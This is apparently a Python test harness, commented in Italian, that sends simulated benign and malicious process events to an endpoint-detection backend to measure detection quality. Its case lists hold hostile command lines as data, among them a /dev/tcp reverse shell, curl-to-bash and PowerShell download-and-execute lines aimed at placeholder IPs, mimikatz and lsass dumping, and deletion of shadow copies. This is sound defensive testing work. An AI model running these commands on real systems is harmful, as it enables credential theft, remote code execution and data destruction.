#!/usr/bin/env python3
"""Simulazione profonda contro uno stack Aegis/Kraken LIVE.

Non esegue malware: costruisce eventi che riproducono il comportamento reale
(process tree, artefatti solo in RAM, connessioni strane, persistenza) e li
invia al Brain con il flusso vero (token deploy -> /enroll -> segreto device).
Misura detection, falsi positivi/negativi, severita', latenza, dedup,
ciclo di resolve e ingestione Kraken.

Per ogni caso viene creato un agente dedicato: la soppressione degli alert e'
per (agente, regola/severita', processo), quindi un solo agente per caso e'
l'unico modo di attribuire un alert al caso esatto senza falsi conteggi.

Uso:
    AEGIS_EMAIL=admin@aegis.local AEGIS_PASSWORD=... \
        python scripts/deep_simulation.py --all --duration 120

    python scripts/deep_simulation.py --scenarios        # casi + resolver
    python scripts/deep_simulation.py --soak --agents 20 --duration 180

Output: docs/benchmarks/4.3/deep-simulation-<UTC>.json + un riepilogo Markdown.
Exit code 0 se tutti i controlli passano, 1 se un controllo funzionale
(telemetria, resolve, Kraken) fallisce. I falsi negativi di detection NON
fanno fallire il comando: sono un risultato misurato, non un errore del test.
"""
from __future__ import annotations

import argparse
import json
import os
import re
import statistics
import subprocess
import sys
import threading
import time
import uuid
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

import requests
import urllib3

urllib3.disable_warnings()

ROOT = Path(__file__).resolve().parents[1]
OUT_DIR = ROOT / "docs" / "benchmarks" / "4.3"
RUN = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")

# ── stato condiviso ──────────────────────────────────────────────────────────
checks: List[Dict[str, Any]] = []
errors: List[str] = []

# L'ingest endpoint limita /enroll a 5/minuto per IP (slowapi). Un rollout di
# flotta passa dallo stesso IP, quindi il test deve rispettare il contratto
# invece di aggirarlo: la spaziatura e' parte della misura operativa.
ENROLL_SPACING_S = 12.2
_enroll_lock = threading.Lock()
_last_enroll = 0.0

CACHE_PATH = ROOT / ".tmp" / "deep-sim" / "agents.json"

def load_cache() -> Dict[str, List[str]]:
    try:
        return json.loads(CACHE_PATH.read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError):
        return {}

def save_cache(cache: Dict[str, List[str]]) -> None:
    CACHE_PATH.parent.mkdir(parents=True, exist_ok=True)
    CACHE_PATH.write_text(json.dumps(cache, indent=2), encoding="utf-8")

def clear_suppression(agent_ids: List[str]) -> None:
    """Rimuove il cooldown degli alert per gli agenti riusati fra due run."""
    if not agent_ids:
        return
    pw = container_env("aegis-redis").get("REDIS_PASSWORD", "")
    for aid in agent_ids:
        try:
            keys = subprocess.run(
                ["docker", "exec", "aegis-redis", "redis-cli", "-a", pw, "--scan",
                 "--pattern", f"sup:*:{aid}:*"],
                capture_output=True, text=True, timeout=30, encoding="utf-8",
                errors="replace")
            for key in (keys.stdout or "").splitlines():
                key = key.strip()
                if key:
                    subprocess.run(["docker", "exec", "aegis-redis", "redis-cli", "-a", pw,
                                    "del", key], capture_output=True, timeout=15)
        except (OSError, subprocess.SubprocessError):
            continue


def check(name: str, ok: bool, detail: str = "") -> bool:
    checks.append({"name": name, "ok": bool(ok), "detail": detail})
    print(f"  [{'ok' if ok else 'FAIL'}] {name}" + (f" — {detail}" if detail else ""))
    if not ok:
        errors.append(f"{name}: {detail}")
    return bool(ok)


def now() -> datetime:
    return datetime.now(timezone.utc)


def iso(ts: Optional[datetime] = None) -> str:
    return (ts or now()).isoformat()


# ── client Brain ─────────────────────────────────────────────────────────────
class Brain:
    def __init__(self, base: str, verify: bool = True):
        self.base = base.rstrip("/")
        self.s = requests.Session()
        self.s.trust_env = False
        self.s.verify = verify
        self.s.headers.update({"Origin": self.base, "Accept": "application/json"})
        self.token = ""
        self.user: Dict[str, Any] = {}

    def _url(self, path: str) -> str:
        return f"{self.base}{path}"

    def login(self, email: str, password: str) -> None:
        r = self.s.post(self._url("/api/v1/auth/login"),
                        json={"email": email, "password": password}, timeout=30)
        if r.status_code != 200:
            raise SystemExit(f"login fallito: {r.status_code} {r.text[:200]}")
        self.token = r.json()["access_token"]
        self.user = {"email": email, "token": self.token}
        self.s.headers["Authorization"] = f"Bearer {self.token}"

    def enroll(self, hostname: str, agent_type: str = "unified",
               os_name: str = "Windows") -> Tuple[str, str]:
        last = ""
        global _last_enroll
        with _enroll_lock:
            wait = ENROLL_SPACING_S - (time.monotonic() - _last_enroll)
            if wait > 0:
                time.sleep(wait)
            _last_enroll = time.monotonic()
        for attempt in range(5):
            r = self.s.post(self._url("/api/v1/deploy/token"), json={
                "label": f"sim-{hostname}"[:120],
                "agent_type": agent_type,
                "ttl_minutes": 30,
            }, timeout=30)
            if r.status_code == 200:
                break
            last = f"{r.status_code} {r.text[:120]}"
            if r.status_code not in (429, 502, 503, 504):
                raise RuntimeError(f"deploy/token {hostname}: {last}")
            time.sleep(2 * (attempt + 1))
        else:
            raise RuntimeError(f"deploy/token {hostname}: {last}")
        tok = r.json()["token"]
        r = self.s.post(self._url("/api/v1/enroll/enroll"), json={
            "hostname": hostname, "os": os_name,
            "enroll_key": tok, "agent_type": agent_type,
        }, timeout=30)
        if r.status_code != 200:
            raise RuntimeError(f"enroll {hostname}: {r.status_code} {r.text[:150]}")
        d = r.json()
        return d["agent_id"], d["agent_secret"]

    @staticmethod
    def agent_headers(agent_id: str, secret: str) -> Dict[str, str]:
        return {"X-Agent-Id": agent_id, "Authorization": f"Bearer {secret}"}

    def report(self, agent_id: str, secret: str, payload: Dict[str, Any],
               headers: Optional[Dict[str, str]] = None) -> requests.Response:
        return self.s.post(self._url("/api/v1/telemetry/report"), json=payload,
                           headers=headers or self.agent_headers(agent_id, secret),
                           timeout=60)

    def heartbeat(self, agent_id: str, secret: str) -> requests.Response:
        return self.s.post(self._url("/api/v1/telemetry/heartbeat"),
                           json={"device_id": agent_id, "agent_version": "sim-4.3"},
                           headers=self.agent_headers(agent_id, secret), timeout=30)

    def alerts(self, **params) -> List[Dict[str, Any]]:
        r = self.s.get(self._url("/api/v1/telemetry/alerts"), params={"limit": 1000, **params},
                       timeout=60)
        if r.status_code != 200:
            raise RuntimeError(f"alerts: {r.status_code} {r.text[:150]}")
        return r.json()

    def alert(self, alert_id: int) -> Dict[str, Any]:
        r = self.s.get(self._url(f"/api/v1/telemetry/alerts/{alert_id}"), timeout=30)
        r.raise_for_status()
        return r.json()

    def resolve(self, alert_id: int, resolved: bool = True) -> requests.Response:
        return self.s.patch(self._url(f"/api/v1/telemetry/alerts/{alert_id}/resolve"),
                            json={"resolved": resolved}, timeout=30)

    def resolve_all(self) -> requests.Response:
        return self.s.post(self._url("/api/v1/telemetry/alerts/resolve-all"), timeout=60)

    def metrics(self) -> Optional[str]:
        try:
            r = requests.get(self._url("/metrics"), timeout=15)
            return r.text if r.status_code == 200 else None
        except requests.RequestException:
            return None


# ── accesso di sola lettura a Postgres/Kraken per la verifica ────────────────
def psql(sql: str, container: str = "aegis-postgres",
         user: str = "aegis_user", db: str = "aegis_db") -> str:
    cmd = ["docker", "exec", container, "psql", "-U", user, "-d", db, "-tAc", sql]
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=60,
                           encoding="utf-8", errors="replace")
        return (p.stdout or "").strip() if p.returncode == 0 else f"ERR:{p.stderr.strip()[:200]}"
    except (OSError, subprocess.SubprocessError) as exc:
        return f"ERR:{exc}"


def container_env(name: str) -> Dict[str, str]:
    try:
        p = subprocess.run(["docker", "inspect", name, "--format",
                            "{{range .Config.Env}}{{println .}}{{end}}"],
                           capture_output=True, text=True, timeout=30,
                           encoding="utf-8", errors="replace")
        if p.returncode != 0:
            return {}
        out = {}
        for line in (p.stdout or "").splitlines():
            if "=" in line:
                k, v = line.split("=", 1)
                out[k.strip()] = v.strip()
        return out
    except (OSError, subprocess.SubprocessError):
        return {}


# ── casi di test ─────────────────────────────────────────────────────────────
PF = r"C:\Program Files"
X86 = r"C:\Program Files (x86)"
W = r"C:\Windows\System32"
T = r"C:\Users\dev\AppData\Local\Temp"
ROAM = r"C:\Users\dev\AppData\Roaming"
PUB = r"C:\Users\Public"

MS = {"signature": "authenticode-trusted", "publisher": "Microsoft Corporation"}
PSF = {"signature": "authenticode-trusted", "publisher": "Python Software Foundation"}
OJS = {"signature": "authenticode-trusted", "publisher": "OpenJS Foundation"}
GOO = {"signature": "authenticode-trusted", "publisher": "Google LLC"}
UNS: Dict[str, Any] = {}


def case(cid: str, group: str, title: str, technique: str,
         event: Dict[str, Any], expected: Optional[bool],
         severity: Optional[str] = None, note: str = "") -> Dict[str, Any]:
    return {"id": cid, "group": group, "title": title, "technique": technique,
            "event": event, "expected": expected, "severity": severity, "note": note}


# Benigni: attesi ZERO alert. Firma e path sono quelli reali.
BENIGN_WINDOWS: List[Dict[str, Any]] = [
    case("ben-code", "benign", "VS Code", "T1204", dict(
        process_name="Code.exe", process_path=rf"{PF}\Microsoft VS Code\Code.exe",
        parent_process_name="explorer.exe", **MS), False),
    case("ben-chrome", "benign", "Chrome", "T1204", dict(
        process_name="chrome.exe", process_path=rf"{PF}\Google\Chrome\Application\chrome.exe",
        parent_process_name="explorer.exe", thread_count=48, **GOO), False),
    case("ben-edge-renderer", "benign", "Edge renderer 180 thread", "T1204", dict(
        process_name="msedge.exe", process_path=rf"{X86}\Microsoft\Edge\Application\msedge.exe",
        parent_process_name="msedge.exe", thread_count=180,
        command_line="msedge.exe --type=renderer --lang=it", **MS), False),
    case("ben-pwsh-getproc", "benign", "PowerShell Get-Process", "T1059.001", dict(
        process_name="pwsh.exe", process_path=rf"{PF}\PowerShell\7\pwsh.exe",
        command_line="pwsh.exe -NoProfile -Command Get-Process", **MS), False),
    case("ben-powershell-legacy", "benign", "PowerShell aggiornamento policy", "T1059.001", dict(
        process_name="powershell.exe", process_path=rf"{W}\WindowsPowerShell\v1.0\powershell.exe",
        command_line="powershell.exe -NoProfile -Command Get-ChildItem C:\\Reports", **MS), False),
    case("ben-cmd-dir", "benign", "cmd /c dir", "T1059.003", dict(
        process_name="cmd.exe", process_path=rf"{W}\cmd.exe",
        command_line="cmd.exe /c dir C:\\Reports", parent_process_name="explorer.exe", **MS), False),
    case("ben-git", "benign", "git status", "T1204", dict(
        process_name="git.exe", process_path=rf"{PF}\Git\bin\git.exe",
        command_line="git.exe status --short", **MS), False),
    case("ben-node", "benign", "node app", "T1204", dict(
        process_name="node.exe", process_path=rf"{PF}\nodejs\node.exe",
        command_line="node.exe server.js", **OJS), False),
    case("ben-npm", "benign", "npm test", "T1204", dict(
        process_name="npm.cmd", process_path=rf"{PF}\nodejs\npm.cmd",
        command_line="npm.cmd run test", **OJS), False),
    case("ben-python", "benign", "python -c print", "T1204", dict(
        process_name="python.exe", process_path=rf"{PF}\Python312\python.exe",
        command_line='python.exe -c "print(1)"', **PSF), False),
    case("ben-java", "benign", "java -version", "T1204", dict(
        process_name="java.exe", process_path=rf"{PF}\Eclipse Adoptium\jdk\bin\java.exe",
        command_line="java.exe -version",
        signature="authenticode-trusted", publisher="Eclipse Adoptium"), False),
    case("ben-dotnet", "benign", ".NET --info", "T1204", dict(
        process_name="dotnet.exe", process_path=rf"{PF}\dotnet\dotnet.exe",
        command_line="dotnet.exe --info", **MS), False),
    case("ben-notepad-temp", "benign", "notepad apre file in Temp", "T1204", dict(
        process_name="notepad.exe", process_path=rf"{W}\notepad.exe",
        command_line=rf"notepad.exe {T}\notes.txt", **MS), False),
    case("ben-explorer-chrome", "benign", "Explorer apre Chrome", "T1204", dict(
        process_name="chrome.exe", process_path=rf"{PF}\Google\Chrome\Application\chrome.exe",
        parent_process_name="explorer.exe", **GOO), False),
    case("ben-certutil-hash", "benign", "certutil -hashfile", "T1140", dict(
        process_name="certutil.exe", process_path=rf"{W}\certutil.exe",
        command_line=r"certutil.exe -hashfile C:\Reports\a.pdf SHA256", **MS), False),
    case("ben-rundll32-printui", "benign", "rundll32 printui.dll", "T1218.011", dict(
        process_name="rundll32.exe", process_path=rf"{W}\rundll32.exe",
        command_line="rundll32.exe printui.dll,PrintUIEntry /il", **MS), False),
    case("ben-reg-query", "benign", "reg query Run", "T1012", dict(
        process_name="reg.exe", process_path=rf"{W}\reg.exe",
        command_line=r"reg.exe query HKCU\Software\Microsoft\Windows\CurrentVersion\Run", **MS), False),
    case("ben-schtasks-query", "benign", "schtasks /query", "T1053.005", dict(
        process_name="schtasks.exe", process_path=rf"{W}\schtasks.exe",
        command_line="schtasks.exe /query /fo LIST", **MS), False),
    case("ben-netstat", "benign", "netstat -ano", "T1016", dict(
        process_name="netstat.exe", process_path=rf"{W}\netstat.exe",
        command_line="netstat.exe -ano", **MS), False),
    case("ben-ipconfig", "benign", "ipconfig /all", "T1016", dict(
        process_name="ipconfig.exe", process_path=rf"{W}\ipconfig.exe",
        command_line="ipconfig.exe /all", **MS), False),
    case("ben-tasklist", "benign", "tasklist", "T1057", dict(
        process_name="tasklist.exe", process_path=rf"{W}\tasklist.exe", **MS), False),
    case("ben-whoami", "benign", "whoami (senza /all)", "T1033", dict(
        process_name="whoami.exe", process_path=rf"{W}\whoami.exe",
        command_line="whoami.exe", **MS), False),
    case("ben-ping", "benign", "ping host interno", "T1018", dict(
        process_name="ping.exe", process_path=rf"{W}\ping.exe",
        command_line="ping.exe -n 2 intranet.local", **MS), False),
    case("ben-ssh-admin", "benign", "ssh amministrativo", "T1021.004", dict(
        process_name="ssh.exe", process_path=rf"{W}\OpenSSH\ssh.exe",
        command_line="ssh.exe deploy@10.0.0.5", **MS), False),
    case("ben-mstsc", "benign", "RDP client", "T1021.001", dict(
        process_name="mstsc.exe", process_path=rf"{W}\mstsc.exe",
        command_line="mstsc.exe /v 10.0.0.9", **MS), False),
    case("ben-wsl", "benign", "wsl --list", "T1204", dict(
        process_name="wsl.exe", process_path=rf"{W}\wsl.exe",
        command_line="wsl.exe --list", **MS), False),
    case("ben-signed-installer", "benign", "installer firmato in Downloads", "T1204", dict(
        process_name="setup.exe", process_path=r"C:\Users\dev\Downloads\setup.exe",
        command_line="setup.exe /S", **MS), False,
        note="path utente-scrivibile ma firma valida: S004 deve essere LOW e soppressa"),
    case("ben-updater", "benign", "updater in Program Files", "T1204", dict(
        process_name="update.exe", process_path=rf"{PF}\Contoso\update.exe",
        command_line="update.exe --silent", signature="authenticode-trusted",
        publisher="Contoso Ltd"), False),
    case("ben-teams", "benign", "Teams", "T1204", dict(
        process_name="teams.exe", process_path=rf"{PF}\WindowsApps\teams.exe",
        **MS), False),
    case("ben-certutil-verify", "benign", "certutil -verifyctl", "T1140", dict(
        process_name="certutil.exe", process_path=rf"{W}\certutil.exe",
        command_line="certutil.exe -verifyctl C:\\Reports\\ctl.cer", **MS), False),
    case("ben-sc-query", "benign", "sc query", "T1007", dict(
        process_name="sc.exe", process_path=rf"{W}\sc.exe",
        command_line="sc.exe query WinDefend", **MS), False),
    case("ben-defender-update", "benign", "Defender aggiorna firme", "T1562", dict(
        process_name="MpCmdRun.exe",
        process_path=rf"{PF}\Windows Defender\MpCmdRun.exe",
        command_line="MpCmdRun.exe -SignatureUpdate", **MS), False),
    case("ben-vssadmin-list", "benign", "vssadmin list shadows", "T1490", dict(
        process_name="vssadmin.exe", process_path=rf"{W}\vssadmin.exe",
        command_line="vssadmin.exe list shadows", **MS), False),
    case("ben-bcdedit-enum", "benign", "bcdedit /enum", "T1490", dict(
        process_name="bcdedit.exe", process_path=rf"{W}\bcdedit.exe",
        command_line="bcdedit.exe /enum", **MS), False),
    case("ben-reg-add-policy", "benign", "policy di gruppo locale", "T1112", dict(
        process_name="reg.exe", process_path=rf"{W}\reg.exe",
        command_line=r"reg.exe add HKLM\Software\Policies\Contoso /v AllowTelemetry /t REG_DWORD /d 0 /f",
        **MS), False),
    case("ben-schtasks-change", "benign", "modifica task esistente", "T1053.005", dict(
        process_name="schtasks.exe", process_path=rf"{W}\schtasks.exe",
        command_line=r"schtasks.exe /change /tn \Microsoft\Windows\Defrag\ScheduledDefrag /disable",
        **MS), False,
        note="S017 scatta su /change: verificare se e' un FP accettabile"),
]

BENIGN_LINUX: List[Dict[str, Any]] = [
    case("ben-linux-bash-ls", "benign", "bash ls", "T1059.004", dict(
        process_name="bash", process_path="/usr/bin/bash",
        command_line="bash -c ls -la /var/log", user="dev", os="Linux"), False,
        note="Linux: nessuna firma disponibile; S009 e' l'unico match atteso"),
    case("ben-linux-systemctl", "benign", "systemctl status", "T1569", dict(
        process_name="systemctl", process_path="/usr/bin/systemctl",
        command_line="systemctl status nginx", user="root", os="Linux"), False),
    case("ben-linux-apt", "benign", "apt-get update", "T1072", dict(
        process_name="apt-get", process_path="/usr/bin/apt-get",
        command_line="apt-get update", user="root", os="Linux"), False),
    case("ben-linux-curl", "benign", "curl https", "T1071.001", dict(
        process_name="curl", process_path="/usr/bin/curl",
        command_line="curl -s https://example.com/health", user="dev", os="Linux"), False),
    case("ben-linux-python", "benign", "python3 script", "T1059.006", dict(
        process_name="python3", process_path="/usr/bin/python3",
        command_line="python3 /srv/app/manage.py check", user="dev", os="Linux"), False),
    case("ben-linux-node", "benign", "node server", "T1204", dict(
        process_name="node", process_path="/usr/bin/node",
        command_line="node /srv/app/server.js", user="dev", os="Linux"), False),
    case("ben-linux-git", "benign", "git fetch", "T1204", dict(
        process_name="git", process_path="/usr/bin/git",
        command_line="git fetch origin", user="dev", os="Linux"), False),
    case("ben-linux-docker", "benign", "docker ps", "T1610", dict(
        process_name="docker", process_path="/usr/bin/docker",
        command_line="docker ps", user="root", os="Linux"), False),
    case("ben-linux-journalctl", "benign", "journalctl", "T1654", dict(
        process_name="journalctl", process_path="/usr/bin/journalctl",
        command_line="journalctl -u nginx -n 50", user="root", os="Linux"), False),
    case("ben-linux-ssh", "benign", "ssh admin", "T1021.004", dict(
        process_name="ssh", process_path="/usr/bin/ssh",
        command_line="ssh deploy@10.0.0.5", user="dev", os="Linux"), False),
]

MALICIOUS: List[Dict[str, Any]] = [
    case("mal-mimikatz", "malicious", "Mimikatz in Temp", "T1003.001", dict(
        process_name="mimikatz.exe", process_path=rf"{T}\mimikatz.exe",
        command_line="mimikatz.exe sekurlsa::logonpasswords"), True, "CRITICAL"),
    case("mal-mimikatz-renamed", "malicious", "Mimikatz rinominato in Roaming", "T1036", dict(
        process_name="svchost_.exe", process_path=rf"{ROAM}\svchost_.exe",
        command_line="svchost_.exe sekurlsa::logonpasswords"), True, None),
    case("mal-procdump-lsass", "malicious", "procdump su lsass", "T1003.001", dict(
        process_name="procdump.exe", process_path=rf"{T}\procdump.exe",
        command_line="procdump.exe -ma lsass.exe out.dmp"), True, "CRITICAL"),
    case("mal-lazagne", "malicious", "LaZagne", "T1555", dict(
        process_name="laZagne.exe", process_path=rf"{T}\laZagne.exe",
        command_line="laZagne.exe all"), True, "CRITICAL"),
    case("mal-ntdsutil", "malicious", "ntdsutil IFM", "T1003.003", dict(
        process_name="ntdsutil.exe", process_path=rf"{W}\ntdsutil.exe",
        command_line=r'ntdsutil.exe "ac i ntds" "ifm" "create full C:\Temp\ifm" q q',
        **MS), True, "CRITICAL"),
    case("mal-psh-encoded", "malicious", "PowerShell encoded hidden", "T1059.001", dict(
        process_name="powershell.exe", process_path=rf"{W}\WindowsPowerShell\v1.0\powershell.exe",
        command_line="powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0AA=="),
        True, "HIGH"),
    case("mal-psh-iex", "malicious", "IEX download string", "T1059.001", dict(
        process_name="pwsh.exe", process_path=rf"{PF}\PowerShell\7\pwsh.exe",
        command_line="pwsh.exe -c \"$x='IEX';&$x((New-Object Net.WebClient).DownloadString('http://203.0.113.5/p'))\""),
        True, "HIGH"),
    case("mal-psh-downloadfile", "malicious", "DownloadFile in temp", "T1105", dict(
        process_name="powershell.exe", process_path=rf"{W}\WindowsPowerShell\v1.0\powershell.exe",
        command_line="powershell.exe -Command (New-Object Net.WebClient).DownloadFile('http://203.0.113.5/a.exe','C:\\Users\\Public\\a.exe')"),
        True, None),
    case("mal-mshta-url", "malicious", "mshta URL remoto", "T1218.005", dict(
        process_name="mshta.exe", process_path=rf"{W}\mshta.exe",
        command_line="mshta.exe http://203.0.113.9/x.hta"), True, "HIGH"),
    case("mal-regsvr32-squiblydoo", "malicious", "regsvr32 squiblydoo", "T1218.010", dict(
        process_name="regsvr32.exe", process_path=rf"{W}\regsvr32.exe",
        command_line="regsvr32.exe /s /n /u /i:http://203.0.113.9/sct.dll scrobj.dll"), True, "HIGH"),
    case("mal-rundll32-js", "malicious", "rundll32 javascript", "T1218.011", dict(
        process_name="rundll32.exe", process_path=rf"{W}\rundll32.exe",
        command_line='rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication";document.write()'), True, "HIGH"),
    case("mal-certutil-urlcache", "malicious", "certutil -urlcache", "T1105", dict(
        process_name="certutil.exe", process_path=rf"{W}\certutil.exe",
        command_line="certutil.exe -urlcache -split -f http://203.0.113.9/a.exe C:\\Users\\Public\\a.exe"), True, "HIGH"),
    case("mal-bitsadmin", "malicious", "bitsadmin transfer", "T1197", dict(
        process_name="bitsadmin.exe", process_path=rf"{W}\bitsadmin.exe",
        command_line="bitsadmin.exe /transfer job1 http://203.0.113.9/x.exe C:\\Users\\Public\\x.exe"), True, "HIGH"),
    case("mal-wmic-create", "malicious", "wmic process call create", "T1047", dict(
        process_name="wmic.exe", process_path=rf"{W}\wbem\wmic.exe",
        command_line='wmic.exe process call create "powershell -enc AAAA=="'), True, "CRITICAL"),
    case("mal-office-psh", "malicious", "Word genera PowerShell", "T1566", dict(
        process_name="powershell.exe", process_path=rf"{W}\WindowsPowerShell\v1.0\powershell.exe",
        parent_process_name="WINWORD.EXE",
        command_line="powershell.exe -NoP -W Hidden -EncodedCommand SQBFAFgA"), True, "CRITICAL"),
    case("mal-browser-svchost", "malicious", "Chrome genera svchost", "T1055", dict(
        process_name="svchost.exe", process_path=rf"{W}\svchost.exe",
        parent_process_name="chrome.exe", **MS), True, "HIGH"),
    case("mal-threads", "malicious", "250 thread (injection)", "T1055", dict(
        process_name="unknown.exe", process_path=rf"{PF}\Vendor\unknown.exe",
        thread_count=250), True, "MEDIUM"),
    case("mal-dll-temp", "malicious", "DLL da Temp", "T1574", dict(
        process_name="explorer.exe", process_path=r"C:\Windows\explorer.exe",
        loaded_modules=[rf"{T}\evil.dll"], **MS), True, "HIGH"),
    case("mal-runkey", "malicious", "Run key persistence", "T1547.001", dict(
        process_name="reg.exe", process_path=rf"{W}\reg.exe",
        command_line=r"reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d C:\Users\Public\x.exe /f"),
        True, "HIGH"),
    case("mal-schtasks-psh", "malicious", "Task che esegue PowerShell", "T1053.005", dict(
        process_name="schtasks.exe", process_path=rf"{W}\schtasks.exe",
        command_line=r'schtasks.exe /create /tn X /tr "powershell -nop -w hidden -e SQBFAFgA" /sc minute /mo 5 /f'),
        True, "CRITICAL"),
    case("mal-defender-disable", "malicious", "Defender disabilitato", "T1562.001", dict(
        process_name="sc.exe", process_path=rf"{W}\sc.exe",
        command_line="sc.exe config WinDefend start= disabled"), True, "CRITICAL"),
    case("mal-kill-av", "malicious", "taskkill su MsMpEng", "T1562.001", dict(
        process_name="taskkill.exe", process_path=rf"{W}\taskkill.exe",
        command_line="taskkill.exe /F /IM MsMpEng.exe"), True, "CRITICAL"),
    case("mal-log-clear", "malicious", "wevtutil cl Security", "T1070.001", dict(
        process_name="wevtutil.exe", process_path=rf"{W}\wevtutil.exe",
        command_line="wevtutil.exe cl Security"), True, "CRITICAL"),
    case("mal-bcdedit", "malicious", "recovery disabilitato", "T1490", dict(
        process_name="bcdedit.exe", process_path=rf"{W}\bcdedit.exe",
        command_line="bcdedit.exe /set recoveryenabled no"), True, "CRITICAL"),
    case("mal-vssadmin", "malicious", "shadow copy cancellate", "T1490", dict(
        process_name="vssadmin.exe", process_path=rf"{W}\vssadmin.exe",
        command_line="vssadmin.exe delete shadows /all /quiet"), True, "CRITICAL"),
    case("mal-wbadmin", "malicious", "catalogo backup cancellato", "T1490", dict(
        process_name="wbadmin.exe", process_path=rf"{W}\wbadmin.exe",
        command_line="wbadmin.exe delete catalog -quiet"), True, "CRITICAL"),
    case("mal-nc-beacon", "malicious", "netcat verso IP pubblico", "T1071", dict(
        process_name="nc.exe", process_path=rf"{T}\nc.exe",
        command_line="nc.exe 203.0.113.7 4444",
        network_connections=[{"remote": "203.0.113.7:4444", "state": "ESTABLISHED"}]), True, None),
    case("mal-fileless-enc", "malicious", "Fileless: nessun path, encoded", "T1027", dict(
        process_name="powershell.exe", process_path="",
        command_line="powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"), True, None,
        note="solo RAM: nessun file sul disco da analizzare"),
    case("mal-fileless-rundll", "malicious", "Fileless rundll32", "T1218.011", dict(
        process_name="rundll32.exe", process_path="",
        command_line='rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication"'), True, None),
    case("mal-masq-svchost", "malicious", "svchost in Roaming", "T1036", dict(
        process_name="svchost.exe", process_path=rf"{ROAM}\svchost.exe"), True, "CRITICAL"),
    case("mal-double-ext", "malicious", "invoice.pdf.exe", "T1036", dict(
        process_name="invoice.pdf.exe", process_path=rf"{PUB}\invoice.pdf.exe"), True, "HIGH"),
    case("mal-dropper", "malicious", "Dropper non firmato", "T1204", dict(
        process_name="update_agent.exe", process_path=rf"{T}\update_agent.exe"), True, "HIGH"),
    case("mal-cmd-base64", "malicious", "cmd con base64 decode", "T1027", dict(
        process_name="cmd.exe", process_path=rf"{W}\cmd.exe",
        command_line='cmd.exe /c certutil -decode payload.b64 payload.exe & payload.exe'), True, None),
    case("mal-lolbin-temp", "malicious", "LOLBin da Temp", "T1218", dict(
        process_name="certutil.exe", process_path=rf"{T}\certutil.exe",
        command_line="certutil.exe -hashfile a.txt"), True, "HIGH"),
    case("mal-linux-revshell", "malicious", "Reverse shell /dev/tcp", "T1059.004", dict(
        process_name="bash", process_path="/usr/bin/bash",
        command_line="bash -i >& /dev/tcp/203.0.113.9/4444 0>&1", user="www-data", os="Linux"),
        True, None),
    case("mal-linux-xmrig", "malicious", "xmrig in /tmp", "T1496", dict(
        process_name="xmrig", process_path="/tmp/xmrig",
        command_line="/tmp/xmrig --url stratum+tcp://pool.example:3333", user="dev", os="Linux"),
        True, None),
    case("mal-linux-curl-pipe", "malicious", "curl | bash", "T1059.004", dict(
        process_name="bash", process_path="/bin/bash",
        command_line="curl -s http://203.0.113.9/i.sh | bash", user="dev", os="Linux"), True, None),
    case("mal-linux-shadow", "malicious", "lettura shadow", "T1003.008", dict(
        process_name="cat", process_path="/usr/bin/cat",
        command_line="cat /etc/shadow", user="www-data", os="Linux"), True, None,
        note="T1003.008 non ha una regola statica: FN atteso"),
    case("mal-linux-tmp-payload", "malicious", "payload in /tmp eseguito", "T1036", dict(
        process_name="kworker", process_path="/tmp/.kworker/x",
        command_line="/tmp/.kworker/x --daemon", user="root", os="Linux"), True, None),
]

DUAL_USE: List[Dict[str, Any]] = [
    case("dual-whoami-all", "dual", "whoami /all", "T1033", dict(
        process_name="whoami.exe", process_path=rf"{W}\whoami.exe",
        command_line="whoami.exe /all", **MS), None, "MEDIUM"),
    case("dual-net-user", "dual", "net user", "T1087", dict(
        process_name="net.exe", process_path=rf"{W}\net.exe",
        command_line="net.exe user", **MS), None, "MEDIUM"),
    case("dual-psexec", "dual", "psexec amministrativo", "T1021.002", dict(
        process_name="psexec.exe", process_path=rf"{PF}\Sysinternals\psexec.exe",
        command_line=r"psexec.exe \\10.0.0.9 cmd.exe", **MS), None, None),
    case("dual-7z", "dual", "7-Zip con password", "T1560", dict(
        process_name="7z.exe", process_path=rf"{PF}\7-Zip\7z.exe",
        command_line="7z.exe a -p backup.7z docs\\",
        signature="authenticode-trusted", publisher="Igor Pavlov"), None, None),
    case("dual-bitsadmin-update", "dual", "BITS update Microsoft", "T1197", dict(
        process_name="bitsadmin.exe", process_path=rf"{W}\bitsadmin.exe",
        command_line="bitsadmin.exe /transfer upd http://download.microsoft.com/u.msu C:\\Temp\\u.msu",
        **MS), None, None),
    case("dual-python-socket", "dual", "python socket lookup", "T1071", dict(
        process_name="python.exe", process_path=rf"{PF}\Python312\python.exe",
        command_line="python.exe -c \"import socket;socket.gethostbyname('example.com')\"",
        **PSF), None, None),
    case("dual-schtasks-backup", "dual", "task di backup", "T1053.005", dict(
        process_name="schtasks.exe", process_path=rf"{W}\schtasks.exe",
        command_line=r'schtasks.exe /create /tn NightlyBackup /tr "%PF%\backup.cmd" /sc daily', **MS),
        None, None),
    case("dual-run-installer", "dual", "installer scrive Run key", "T1547.001", dict(
        process_name="reg.exe", process_path=rf"{W}\reg.exe",
        command_line=r"reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MyApp /d \"C:\Program Files\MyApp\app.exe\" /f",
        **MS), None, None),
]


# ── invio scenari ────────────────────────────────────────────────────────────
def send_case(brain: Brain, c: Dict[str, Any], cached: Optional[Dict[str, List[str]]] = None) -> Dict[str, Any]:
    # L'hostname deve essere nuovo a ogni run: /enroll rifiuta una
    # re-enrollment con un token non host-bound (409). Il suffisso RUN evita
    # di collidere con gli agenti della run precedente.
    host = f"sim-{c['id']}-{RUN[9:]}"[:60]
    started = time.monotonic()
    try:
        if cached and c["id"] in cached:
            agent_id, secret = cached[c["id"]]
        else:
            agent_id, secret = brain.enroll(host, os_name=c["event"].get("os", "Windows"))
            if cached is not None:
                cached[c["id"]] = [agent_id, secret]
    except Exception as exc:  # noqa: BLE001 - il report deve dire quale caso e' fallito
